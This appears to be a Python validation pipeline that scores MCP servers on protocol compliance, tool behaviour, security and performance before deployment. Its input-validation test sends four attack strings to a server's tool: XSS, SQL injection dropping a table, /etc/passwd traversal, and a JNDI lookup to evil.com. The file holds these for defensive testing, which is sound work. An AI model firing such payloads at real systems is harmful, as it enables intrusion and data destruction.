#!/usr/bin/env python3
"""
MCP Server Validation Pipeline

Comprehensive validation pipeline for MCP servers before deployment to the gateway.
Includes protocol compliance, tool functionality, security, and performance validation.
"""

import asyncio
import json
import yaml
import sys
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import logging

# Add current directory to path for imports
sys.path.append(str(Path(__file__).parent))

from mcp_test_framework import MCPServerTester, TestRunner, TestCase, TestSuite, TestResult
from tests.test_mcp_protocol import create_protocol_test_suite
from tests.test_tool_execution import create_tool_execution_test_suite

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class ValidationResult:
    """Result of validation pipeline"""
    server_name: str
    success: bool
    overall_score: float
    timestamp: datetime
    protocol_compliance: Dict[str, Any]
    tool_functionality: Dict[str, Any]
    security_assessment: Dict[str, Any]
    performance_metrics: Dict[str, Any]
    deployment_recommendation: str
    issues: List[str]
    warnings: List[str]


class ValidationPipeline:
    """Main validation pipeline for MCP servers"""
    
    def __init__(self, working_dir: str = None):
        self.working_dir = Path(working_dir) if working_dir else Path.cwd()
        self.validation_results = []
        
        # Validation thresholds
        self.thresholds = {
            "protocol_compliance_min": 0.9,      # 90% protocol tests must pass
            "tool_functionality_min": 0.8,       # 80% tool tests must pass
            "security_score_min": 0.85,          # 85% security score required
            "performance_response_time_max": 30.0,  # 30 second max response time
            "overall_score_min": 0.8             # 80% overall score for deployment
        }
    
    async def validate_server(self, server_name: str, server_config: dict) -> ValidationResult:
        """Run complete validation pipeline on a server"""
        logger.info(f"Starting validation for server: {server_name}")
        
        # Initialize result
        result = ValidationResult(
            server_name=server_name,
            success=False,
            overall_score=0.0,
            timestamp=datetime.now(),
            protocol_compliance={},
            tool_functionality={},
            security_assessment={},
            performance_metrics={},
            deployment_recommendation="",
            issues=[],
            warnings=[]
        )
        
        try:
            # Phase 1: Protocol Compliance
            logger.info("Phase 1: Protocol Compliance Testing")
            protocol_result = await self._test_protocol_compliance(server_name, server_config)
            result.protocol_compliance = protocol_result
            
            if protocol_result["success_rate"] < self.thresholds["protocol_compliance_min"]:
                result.issues.append(f"Protocol compliance too low: {protocol_result['success_rate']:.1%}")
            
            # Phase 2: Tool Functionality  
            logger.info("Phase 2: Tool Functionality Testing")
            tool_result = await self._test_tool_functionality(server_name, server_config)
            result.tool_functionality = tool_result
            
            if tool_result["success_rate"] < self.thresholds["tool_functionality_min"]:
                result.issues.append(f"Tool functionality too low: {tool_result['success_rate']:.1%}")
            
            # Phase 3: Security Assessment
            logger.info("Phase 3: Security Assessment")
            security_result = await self._assess_security(server_name, server_config)
            result.security_assessment = security_result
            
            if security_result["security_score"] < self.thresholds["security_score_min"]:
                result.issues.append(f"Security score too low: {security_result['security_score']:.1%}")
            
            # Phase 4: Performance Metrics
            logger.info("Phase 4: Performance Testing")
            performance_result = await self._test_performance(server_name, server_config)
            result.performance_metrics = performance_result
            
            if performance_result["avg_response_time"] > self.thresholds["performance_response_time_max"]:
                result.warnings.append(f"Slow response time: {performance_result['avg_response_time']:.1f}s")
            
            # Calculate overall score
            result.overall_score = self._calculate_overall_score(
                protocol_result, tool_result, security_result, performance_result
            )
            
            # Make deployment recommendation
            result.deployment_recommendation = self._make_deployment_recommendation(result)
            result.success = result.overall_score >= self.thresholds["overall_score_min"] and len(result.issues) == 0
            
            logger.info(f"Validation complete. Overall score: {result.overall_score:.1%}")
            
        except Exception as e:
            logger.error(f"Validation failed with error: {e}")
            result.issues.append(f"Validation pipeline error: {str(e)}")
            result.deployment_recommendation = "REJECTED - Validation pipeline failed"
        
        self.validation_results.append(result)
        return result
    
    async def _test_protocol_compliance(self, server_name: str, server_config: dict) -> Dict[str, Any]:
        """Test MCP protocol compliance"""
        try:
            tester = MCPServerTester(server_config)
            runner = TestRunner()
            
            # Create and run protocol test suite
            test_suite = create_protocol_test_suite()
            results = await runner.run_test_suite(test_suite, tester)
            
            # Generate report
            report = runner.generate_report()
            summary = report["summary"]
            
            # Extract key metrics
            protocol_result = {
                "total_tests": summary["total_tests"],
                "passed": summary["passed"],
                "failed": summary["failed"],
                "errors": summary["errors"],
                "success_rate": summary["success_rate"] / 100.0,
                "duration": summary["total_duration"],
                "critical_failures": []
            }
            
            # Check for critical protocol failures
            for test_result in report["test_results"]:
                if test_result["required"] and test_result["result"] in ["failed", "error"]:
                    protocol_result["critical_failures"].append({
                        "test": test_result["name"],
                        "message": test_result["message"]
                    })
            
            return protocol_result
            
        except Exception as e:
            return {
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "errors": 1,
                "success_rate": 0.0,
                "duration": 0.0,
                "error": str(e),
                "critical_failures": [{"test": "protocol_setup", "message": str(e)}]
            }
    
    async def _test_tool_functionality(self, server_name: str, server_config: dict) -> Dict[str, Any]:
        """Test tool functionality and execution"""
        try:
            tester = MCPServerTester(server_config)
            runner = TestRunner()
            
            # Create and run tool execution test suite
            test_suite = create_tool_execution_test_suite()
            results = await runner.run_test_suite(test_suite, tester)
            
            # Generate report
            report = runner.generate_report()
            summary = report["summary"]
            
            # Extract tool-specific metrics
            tool_result = {
                "total_tests": summary["total_tests"],
                "passed": summary["passed"],
                "failed": summary["failed"],
                "errors": summary["errors"],
                "success_rate": summary["success_rate"] / 100.0,
                "duration": summary["total_duration"],
                "tool_specific_results": []
            }
            
            # Analyze tool-specific results
            for test_result in report["test_results"]:
                if "tool_execution_basic" in test_result["name"]:
                    details = test_result.get("details", {})
                    tool_result["tool_specific_results"].append({
                        "test": test_result["name"],
                        "success": test_result["result"] == "passed",
                        "successful_tools": details.get("successful_tools", []),
                        "failed_tools": details.get("failed_tools", [])
                    })
            
            return tool_result
            
        except Exception as e:
            return {
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "errors": 1,
                "success_rate": 0.0,
                "duration": 0.0,
                "error": str(e),
                "tool_specific_results": []
            }
    
    async def _assess_security(self, server_name: str, server_config: dict) -> Dict[str, Any]:
        """Assess security aspects of the server"""
        try:
            security_result = {
                "security_score": 0.8,  # Default reasonable score
                "container_security": {},
                "input_validation": {},
                "error_handling": {},
                "security_warnings": []
            }
            
            # Test container security
            container_security = await self._test_container_security(server_config)
            security_result["container_security"] = container_security
            
            # Test input validation
            input_validation = await self._test_input_validation(server_config)
            security_result["input_validation"] = input_validation
            
            # Test error handling
            error_handling = await self._test_error_handling(server_config)
            security_result["error_handling"] = error_handling
            
            # Calculate security score
            scores = [
                container_security.get("score", 0.8),
                input_validation.get("score", 0.8),
                error_handling.get("score", 0.8)
            ]
            security_result["security_score"] = sum(scores) / len(scores)
            
            # Aggregate security warnings
            for component in [container_security, input_validation, error_handling]:
                security_result["security_warnings"].extend(component.get("warnings", []))
            
            return security_result
            
        except Exception as e:
            return {
                "security_score": 0.0,
                "container_security": {},
                "input_validation": {},
                "error_handling": {},
                "error": str(e),
                "security_warnings": [f"Security assessment failed: {str(e)}"]
            }
    
    async def _test_container_security(self, server_config: dict) -> Dict[str, Any]:
        """Test container security configuration"""
        result = {
            "score": 0.8,
            "checks": [],
            "warnings": []
        }
        
        # Check for non-root user
        image = server_config.get("image", "")
        if "root" in image.lower():
            result["warnings"].append("Container may be running as root user")
            result["score"] -= 0.1
        
        # Check environment variables for secrets
        env_vars = server_config.get("environment", {})
        for key, value in env_vars.items():
            if any(secret_word in key.lower() for secret_word in ["password", "secret", "key", "token"]):
                if len(str(value)) > 20:  # Might be a real secret
                    result["warnings"].append(f"Potential secret in environment variable: {key}")
                    result["score"] -= 0.05
        
        result["checks"].append("Container security configuration reviewed")
        return result
    
    async def _test_input_validation(self, server_config: dict) -> Dict[str, Any]:
        """Test input validation by attempting various inputs"""
        result = {
            "score": 0.8,
            "validation_tests": [],
            "warnings": []
        }
        
        try:
            tester = MCPServerTester(server_config)
            started = await tester.start_server()
            
            if started:
                await tester.initialize_server()
                success, message, tools = await tester.discover_tools()
                
                if success and tools:
                    # Test first tool with malicious inputs
                    tool_name = tools[0]["name"]
                    
                    malicious_inputs = [
                        {"test_param": "<script>alert('xss')</script>"},
                        {"test_param": "'; DROP TABLE users; --"},
                        {"test_param": "../../../etc/passwd"},
                        {"test_param": "${jndi:ldap://evil.com/a}"}
                    ]
                    
                    safe_responses = 0
                    for i, malicious_input in enumerate(malicious_inputs):
                        try:
                            success, msg, response = await tester.test_tool_execution(tool_name, malicious_input)
                            
                            # Check if server handled input safely
                            if "error" in response or not success:
                                safe_responses += 1
                            elif success:
                                # Check if output contains the malicious input (potential vulnerability)
                                content = str(response.get("result", {}))
                                if not any(inp in content for inp in malicious_input.values()):
                                    safe_responses += 1
                            
                            result["validation_tests"].append({
                                "input": malicious_input,
                                "safe": "error" in response or not success
                            })
                            
                        except Exception:
                            safe_responses += 1  # Errors are safe
                    
                    # Calculate score based on safe responses
                    safety_rate = safe_responses / len(malicious_inputs)
                    result["score"] = safety_rate
                    
                    if safety_rate < 0.8:
                        result["warnings"].append(f"Input validation may be weak: {safety_rate:.1%} safe responses")
                
                await tester.stop_server()
        
        except Exception as e:
            result["warnings"].append(f"Input validation testing failed: {str(e)}")
            result["score"] = 0.5
        
        return result
    
    async def _test_error_handling(self, server_config: dict) -> Dict[str, Any]:
        """Test error handling robustness"""
        result = {
            "score": 0.8,
            "error_tests": [],
            "warnings": []
        }
        
        try:
            tester = MCPServerTester(server_config)
            started = await tester.start_server()
            
            if started:
                await tester.initialize_server()
                
                # Test various error scenarios
                error_scenarios = [
                    ("invalid_method", "nonexistent/method", {}),
                    ("malformed_params", "tools/list", {"invalid": "structure"}),
                    ("missing_params", "tools/call", {}),  # Missing required params
                ]
                
                graceful_errors = 0
                for scenario_name, method, params in error_scenarios:
                    try:
                        response = await tester.send_request(method, params)
                        
                        # Check if server returned proper error response
                        if "error" in response:
                            error = response["error"]
                            if isinstance(error, dict) and "code" in error and "message" in error:
                                graceful_errors += 1
                        
                        result["error_tests"].append({
                            "scenario": scenario_name,
                            "graceful": "error" in response
                        })
                        
                    except Exception as e:
                        # Server crashed or became unresponsive
                        result["error_tests"].append({
                            "scenario": scenario_name,
                            "graceful": False,
                            "error": str(e)
                        })
                
                # Calculate score based on graceful error handling
                if error_scenarios:
                    error_handling_rate = graceful_errors / len(error_scenarios)
                    result["score"] = error_handling_rate
                    
                    if error_handling_rate < 0.8:
                        result["warnings"].append(f"Error handling may be inadequate: {error_handling_rate:.1%} graceful")
                
                await tester.stop_server()
        
        except Exception as e:
            result["warnings"].append(f"Error handling testing failed: {str(e)}")
            result["score"] = 0.5
        
        return result
    
    async def _test_performance(self, server_name: str, server_config: dict) -> Dict[str, Any]:
        """Test performance characteristics"""
        try:
            tester = MCPServerTester(server_config)
            
            # Measure startup time
            import time
            start_time = time.time()
            started = await tester.start_server()
            startup_time = time.time() - start_time
            
            performance_result = {
                "startup_time": startup_time,
                "avg_response_time": 0.0,
                "response_times": [],
                "memory_usage": "unknown",
                "cpu_usage": "unknown"
            }
            
            if started:
                # Test response times
                response_times = []
                
                # Initialize server
                start_time = time.time()
                await tester.initialize_server()
                init_time = time.time() - start_time
                response_times.append(("initialize", init_time))
                
                # Discover tools
                start_time = time.time()
                success, message, tools = await tester.discover_tools()
                discovery_time = time.time() - start_time
                response_times.append(("tools/list", discovery_time))
                
                # Test tool execution if tools available
                if success and tools:
                    tool_name = tools[0]["name"]
                    start_time = time.time()
                    await tester.test_tool_execution(tool_name, {})
                    execution_time = time.time() - start_time
                    response_times.append(("tools/call", execution_time))
                
                # Calculate average response time
                if response_times:
                    avg_response_time = sum(t[1] for t in response_times) / len(response_times)
                    performance_result["avg_response_time"] = avg_response_time
                    performance_result["response_times"] = response_times
                
                await tester.stop_server()
            
            return performance_result
            
        except Exception as e:
            return {
                "startup_time": 999.0,
                "avg_response_time": 999.0,
                "response_times": [],
                "memory_usage": "unknown",
                "cpu_usage": "unknown",
                "error": str(e)
            }
    
    def _calculate_overall_score(self, 
                                protocol_result: Dict[str, Any],
                                tool_result: Dict[str, Any],
                                security_result: Dict[str, Any],
                                performance_result: Dict[str, Any]) -> float:
        """Calculate overall validation score"""
        
        # Weight the different aspects
        weights = {
            "protocol": 0.4,    # 40% - Protocol compliance is critical
            "tools": 0.3,       # 30% - Tool functionality is important
            "security": 0.2,    # 20% - Security is important
            "performance": 0.1  # 10% - Performance is nice to have
        }
        
        # Get scores for each aspect
        protocol_score = protocol_result.get("success_rate", 0.0)
        tool_score = tool_result.get("success_rate", 0.0)
        security_score = security_result.get("security_score", 0.0)
        
        # Performance score based on response time
        avg_response_time = performance_result.get("avg_response_time", 30.0)
        performance_score = max(0.0, 1.0 - (avg_response_time / 30.0))  # 30s = 0 score
        
        # Calculate weighted overall score
        overall_score = (
            protocol_score * weights["protocol"] +
            tool_score * weights["tools"] +
            security_score * weights["security"] +
            performance_score * weights["performance"]
        )
        
        return min(1.0, max(0.0, overall_score))  # Clamp to [0, 1]
    
    def _make_deployment_recommendation(self, result: ValidationResult) -> str:
        """Make deployment recommendation based on validation results"""
        
        if result.overall_score >= 0.9 and len(result.issues) == 0:
            return "APPROVED - Ready for production deployment"
        elif result.overall_score >= 0.8 and len(result.issues) == 0:
            return "APPROVED - Ready for deployment with monitoring"
        elif result.overall_score >= 0.7 and len(result.issues) <= 1:
            return "CONDITIONAL - Address issues before deployment"
        elif result.overall_score >= 0.5:
            return "NEEDS_WORK - Significant improvements needed"
        else:
            return "REJECTED - Server not ready for deployment"
    
    def generate_validation_report(self, result: ValidationResult) -> Dict[str, Any]:
        """Generate comprehensive validation report"""
        
        report = {
            "validation_summary": {
                "server_name": result.server_name,
                "timestamp": result.timestamp.isoformat(),
                "overall_score": result.overall_score,
                "success": result.success,
                "recommendation": result.deployment_recommendation
            },
            "detailed_results": {
                "protocol_compliance": result.protocol_compliance,
                "tool_functionality": result.tool_functionality,
                "security_assessment": result.security_assessment,
                "performance_metrics": result.performance_metrics
            },
            "issues_and_warnings": {
                "issues": result.issues,
                "warnings": result.warnings,
                "issue_count": len(result.issues),
                "warning_count": len(result.warnings)
            },
            "thresholds_used": self.thresholds,
            "next_steps": self._generate_next_steps(result)
        }
        
        return report
    
    def _generate_next_steps(self, result: ValidationResult) -> List[str]:
        """Generate next steps based on validation results"""
        next_steps = []
        
        if result.success:
            next_steps.append("✅ Server passed validation")
            next_steps.append("📝 Add server to servers.yaml configuration")
            next_steps.append("🚀 Deploy to MCP Gateway")
            next_steps.append("📊 Monitor performance and error rates")
        else:
            next_steps.append("❌ Server failed validation")
            
            # Specific improvement suggestions
            if result.protocol_compliance.get("success_rate", 0) < self.thresholds["protocol_compliance_min"]:
                next_steps.append("🔧 Fix protocol compliance issues")
                
            if result.tool_functionality.get("success_rate", 0) < self.thresholds["tool_functionality_min"]:
                next_steps.append("🔧 Improve tool functionality and error handling")
                
            if result.security_assessment.get("security_score", 0) < self.thresholds["security_score_min"]:
                next_steps.append("🔒 Address security vulnerabilities")
                
            if result.performance_metrics.get("avg_response_time", 0) > self.thresholds["performance_response_time_max"]:
                next_steps.append("⚡ Optimize performance and response times")
            
            next_steps.append("🔄 Re-run validation after fixes")
        
        return next_steps
    
    def save_validation_report(self, result: ValidationResult, output_file: str):
        """Save validation report to file"""
        report = self.generate_validation_report(result)
        
        output_path = Path(output_file)
        
        if output_path.suffix.lower() == '.json':
            with open(output_path, 'w') as f:
                json.dump(report, f, indent=2, default=str)
        elif output_path.suffix.lower() == '.yaml':
            with open(output_path, 'w') as f:
                yaml.dump(report, f, default_flow_style=False)
        else:
            # Text format
            with open(output_path, 'w') as f:
                self._write_text_report(report, f)
        
        logger.info(f"Validation report saved to: {output_path}")


# CLI interface
async def main():
    """Main CLI interface for validation pipeline"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Validate MCP server before deployment")
    parser.add_argument("server_name", help="Name of server to validate")
    parser.add_argument("--config", default="servers.yaml", help="Server configuration file")
    parser.add_argument("--output", help="Output file for validation report")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Load server configuration
    try:
        with open(args.config, 'r') as f:
            servers_config = yaml.safe_load(f)
        
        if args.server_name not in servers_config:
            print(f"❌ Server '{args.server_name}' not found in {args.config}")
            return 1
        
        server_config = servers_config[args.server_name]
        
    except Exception as e:
        print(f"❌ Error loading server configuration: {e}")
        return 1
    
    # Run validation pipeline
    print(f"🚀 Starting validation for server: {args.server_name}")
    print("=" * 60)
    
    pipeline = ValidationPipeline()
    result = await pipeline.validate_server(args.server_name, server_config)
    
    # Print results
    print(f"\n📊 Validation Results for {args.server_name}")
    print("=" * 60)
    print(f"Overall Score: {result.overall_score:.1%}")
    print(f"Status: {'✅ PASSED' if result.success else '❌ FAILED'}")
    print(f"Recommendation: {result.deployment_recommendation}")
    
    if result.issues:
        print(f"\n❌ Issues ({len(result.issues)}):")
        for issue in result.issues:
            print(f"  • {issue}")
    
    if result.warnings:
        print(f"\n⚠️  Warnings ({len(result.warnings)}):")
        for warning in result.warnings:
            print(f"  • {warning}")
    
    # Print component scores
    print(f"\n📈 Component Scores:")
    print(f"  Protocol Compliance: {result.protocol_compliance.get('success_rate', 0):.1%}")
    print(f"  Tool Functionality: {result.tool_functionality.get('success_rate', 0):.1%}")
    print(f"  Security Assessment: {result.security_assessment.get('security_score', 0):.1%}")
    print(f"  Performance: {30 - result.performance_metrics.get('avg_response_time', 30):.1f}s avg response")
    
    # Save report if requested
    if args.output:
        pipeline.save_validation_report(result, args.output)
        print(f"\n📄 Detailed report saved to: {args.output}")
    
    return 0 if result.success else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))